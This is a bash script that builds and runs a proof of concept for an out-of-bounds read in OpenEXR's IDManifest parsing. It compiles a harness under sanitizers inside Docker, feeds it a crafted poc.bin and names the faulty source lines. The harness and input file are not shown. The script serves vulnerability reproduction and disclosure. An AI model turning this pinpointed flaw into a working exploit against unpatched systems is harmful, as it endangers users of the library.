#!/usr/bin/env bash
# Build and run PoC 02: OOB read on short string in IDManifest string prefix expansion
# Validated against OpenEXR main commit c13e0e1 (2026-04-16)
#
# Usage: bash build.sh
# Requirements: Docker image vulagent/openexr:main-20260417
set -e

DIR="$(cd "$(dirname "$0")" && pwd)"
IMAGE=vulagent/openexr:main-20260417

_build_stubs() {
  # Emits stub headers into /tmp/idmb/include inside the container
  cat << 'EOS'
SRC=/src/openexr/src/lib
BUILD=/tmp/idmb
mkdir -p "$BUILD/include"

cat > "$BUILD/include/OpenEXRConfig.h" << "EOF"
#ifndef INCLUDED_OPENEXR_CONFIG_H
#define INCLUDED_OPENEXR_CONFIG_H 1
#pragma once
#define OPENEXR_VERSION_MAJOR 4
#define OPENEXR_VERSION_MINOR 0
#define OPENEXR_VERSION_PATCH 0
#define OPENEXR_IMF_INTERNAL_NAMESPACE Imf_4_0
#define OPENEXR_IMF_NAMESPACE Imf
#define OPENEXR_ENABLE_API_VISIBILITY 1
#define OPENEXR_EXPORT __attribute__((__visibility__("default")))
#define OPENEXR_HIDDEN __attribute__((__visibility__("hidden")))
#define OPENEXR_EXPORT_TYPE OPENEXR_EXPORT
#define OPENEXR_EXPORT_EXTERN_TEMPLATE OPENEXR_EXPORT
#define OPENEXR_EXPORT_ENUM OPENEXR_EXPORT
#define OPENEXR_EXPORT_TEMPLATE_TYPE OPENEXR_EXPORT
#define OPENEXR_EXPORT_TEMPLATE_INSTANCE OPENEXR_EXPORT
#endif
EOF

cat > "$BUILD/include/IexConfig.h" << "EOF"
#ifndef INCLUDED_IEXCONFIG_H
#define INCLUDED_IEXCONFIG_H 1
#pragma once
#include "OpenEXRConfig.h"
#define IEX_EXPORT OPENEXR_EXPORT
#define IEX_HIDDEN OPENEXR_HIDDEN
#define IEX_EXPORT_TYPE OPENEXR_EXPORT_TYPE
#define IEX_EXPORT_ENUM OPENEXR_EXPORT_ENUM
#define IEX_EXPORT_TEMPLATE_TYPE OPENEXR_EXPORT_TEMPLATE_TYPE
#define IEX_EXPORT_TEMPLATE_INSTANCE OPENEXR_EXPORT_TEMPLATE_INSTANCE
#define IEX_EXPORT_EXTERN_TEMPLATE OPENEXR_EXPORT_EXTERN_TEMPLATE
#define IEX_NAMESPACE Iex
#define IEX_INTERNAL_NAMESPACE Iex
#define IEXMATH_NAMESPACE IexMath
#define IEX_NAMESPACE_SOURCE_ENTER namespace Iex {
#define IEX_NAMESPACE_SOURCE_EXIT }
#define IEX_NAMESPACE_HEADER_ENTER namespace Iex {
#define IEX_NAMESPACE_HEADER_EXIT }
#endif
EOF

cat > "$BUILD/include/IlmThreadConfig.h" << "EOF"
#ifndef INCLUDED_ILMTHREADCONFIG_H
#define INCLUDED_ILMTHREADCONFIG_H 1
#pragma once
#include "OpenEXRConfig.h"
#define ILMTHREAD_EXPORT OPENEXR_EXPORT
#define ILMTHREAD_HIDDEN OPENEXR_HIDDEN
#define ILMTHREAD_EXPORT_TYPE OPENEXR_EXPORT_TYPE
#define ILMTHREAD_NAMESPACE IlmThread
#define ILMTHREAD_INTERNAL_NAMESPACE IlmThread
#define ILMTHREAD_THREADING_ENABLED 0
#endif
EOF

cat > "$BUILD/include/half.h" << "EOF"
#ifndef _HALF_H_
#define _HALF_H_
#pragma once
#include <stdint.h>
class half {
public:
    half() : _bits(0) {}
    half(float f) : _bits(0) { (void)f; }
    uint16_t bits() const { return _bits; }
    void setBits(uint16_t b) { _bits = b; }
    operator float() const { return 0.0f; }
private:
    uint16_t _bits;
};
#endif
EOF

cat > "$BUILD/include/openexr_compression.h" << "EOF"
#ifndef OPENEXR_COMPRESSION_H
#define OPENEXR_COMPRESSION_H
#pragma once
#include <stddef.h>
#ifdef __cplusplus
extern "C" {
#endif
typedef int exr_result_t;
static inline exr_result_t exr_uncompress_buffer(void*c,const void*d,size_t ds,void*out,size_t ous,size_t*s){return -1;}
static inline size_t exr_compress_max_buffer_size(size_t s){return s*2+64;}
static inline exr_result_t exr_compress_buffer(void*c,int l,const void*s,size_t ss,void*d,size_t dc,size_t*cs){return -1;}
#ifdef __cplusplus
}
#endif
#endif
EOF
EOS
}

echo "[*] Mode 1: ASAN+UBSan build — demonstrates OOB data use (substr exception)..."
docker run --rm \
  -v "$DIR":/poc \
  "$IMAGE" bash -c "
    $(_build_stubs)
    cp /poc/harness.cpp /poc/idmanifest_harness.cpp
    clang++ \\
      -fsanitize=address,undefined \\
      -fno-sanitize-recover=all \\
      -fno-omit-frame-pointer \\
      -g -O1 -std=c++14 \\
      -fvisibility=default -Wno-macro-redefined \\
      -I\"\$BUILD/include\" -I\"\$SRC/OpenEXR\" -I\"\$SRC/Iex\" \\
      -I\"\$SRC/IlmThread\" -I\"\$SRC/OpenEXRCore\" \\
      /poc/idmanifest_harness.cpp \\
      \"\$SRC/OpenEXR/ImfIDManifest.cpp\" \\
      \"\$SRC/Iex/IexBaseExc.cpp\" \"\$SRC/Iex/IexThrowErrnoExc.cpp\" \\
      -o /poc/idmanifest_harness
    echo 'Build OK'
  "

docker run --rm \
  -v "$DIR":/poc \
  -e ASAN_OPTIONS="detect_leaks=0:print_stacktrace=1" \
  -e UBSAN_OPTIONS="print_stacktrace=1" \
  "$IMAGE" \
  /poc/idmanifest_harness /poc/poc.bin 2>&1 || true

echo ""
echo "[*] Mode 2: _GLIBCXX_DEBUG build — triggers assertion '__pos <= size()' failed..."
docker run --rm \
  -v "$DIR":/poc \
  "$IMAGE" bash -c "
    $(_build_stubs)
    cp /poc/harness.cpp /poc/idmanifest_harness.cpp 2>/dev/null || true
    clang++ \\
      -g -O0 -std=c++14 -D_GLIBCXX_DEBUG \\
      -fvisibility=default -Wno-macro-redefined \\
      -I\"\$BUILD/include\" -I\"\$SRC/OpenEXR\" -I\"\$SRC/Iex\" \\
      -I\"\$SRC/IlmThread\" -I\"\$SRC/OpenEXRCore\" \\
      /poc/idmanifest_harness.cpp \\
      \"\$SRC/OpenEXR/ImfIDManifest.cpp\" \\
      \"\$SRC/Iex/IexBaseExc.cpp\" \"\$SRC/Iex/IexThrowErrnoExc.cpp\" \\
      -o /tmp/harness_debug
    (script -q -c '/tmp/harness_debug /poc/poc.bin' /dev/null 2>&1) | cat
  " || true

echo ""
echo "Expected:"
echo "  Mode 1: Exception: basic_string::substr: __pos (which is N) > this->size() (which is 0)"
echo "  Mode 2: Assertion '__pos <= size()' failed in std::basic_string::operator[]"
echo "Source:   ImfIDManifest.cpp:342-343, commit c13e0e1 (2026-04-16)"
